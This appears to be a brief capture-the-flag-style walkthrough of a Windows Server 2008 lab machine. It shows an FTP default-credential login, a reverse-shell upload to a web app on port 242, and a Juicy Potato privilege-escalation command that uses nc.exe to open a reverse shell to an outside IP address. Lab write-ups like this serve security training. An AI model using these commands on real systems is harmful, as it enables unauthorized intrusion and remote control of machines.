21/tcp   open  ftp
242/tcp  open  direct
3145/tcp open  csi-lfap
3389/tcp open  ms-wbt-server


port 242
login page
<img width="1324" height="421" alt="image" src="https://github.com/user-attachments/assets/0d037002-7d2a-4398-bcc5-21f21786d77b" />

ftp. i can access but cant actly download anything
<img width="740" height="285" alt="image" src="https://github.com/user-attachments/assets/af1265cf-4f8e-4dde-9f50-8517280a81ba" />
<img width="1151" height="300" alt="image" src="https://github.com/user-attachments/assets/1e1de006-7e78-4d26-8ae9-f4c3a5b44118" />
so i ftp using admin:admin  
<img width="655" height="309" alt="image" src="https://github.com/user-attachments/assets/a982bae3-a121-4159-bc9a-4bfcf28bd54f" />

credentials. offsec:elite
<img width="926" height="337" alt="image" src="https://github.com/user-attachments/assets/0eac78fb-360c-4957-a807-0b351e0e6814" />

logged in to http port 242 website
<img width="1251" height="152" alt="image" src="https://github.com/user-attachments/assets/5631efbb-f64c-49b4-9fbf-85e174944edd" />

put revshell into the ftp server
<img width="717" height="132" alt="image" src="https://github.com/user-attachments/assets/a40ee038-fe4c-479f-9fa6-ce6e30e42567" />
<img width="1181" height="117" alt="image" src="https://github.com/user-attachments/assets/46032768-d4ba-42b7-873c-f5e044becda7" />
<img width="718" height="182" alt="image" src="https://github.com/user-attachments/assets/de6d8b9f-57c0-4e30-a8a4-ecb578092aa4" />

running 32 bit 
<img width="512" height="67" alt="image" src="https://github.com/user-attachments/assets/bbf9ac7b-7614-42e7-b1cf-4a26f1789ec3" />

system info. this machine is 2008 and x86. old as hell. no wonder my printspoofer and god and sigma potato didnt work....
<img width="714" height="585" alt="image" src="https://github.com/user-attachments/assets/5fefcaf4-1f0a-4db1-ba59-2377bf4f483c" />

use spicy potato x86
get the clsid from https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise 
Juicy.Potato.x86.exe -t * -p c:\windows\system32\cmd.exe -a "/c C:\Users\apache\Desktop\nc.exe 192.168.45.184 1337 -e cmd.exe" -l 1337 -c "{3c6859ce-230b-48a4-be6c-932c0c202048}"
<img width="1329" height="181" alt="image" src="https://github.com/user-attachments/assets/bb92c841-9102-4de5-a846-a71a03d6f829" />
<img width="286" height="114" alt="image" src="https://github.com/user-attachments/assets/67f6769a-bbb4-432f-9a48-b7eb02a4e57d" />
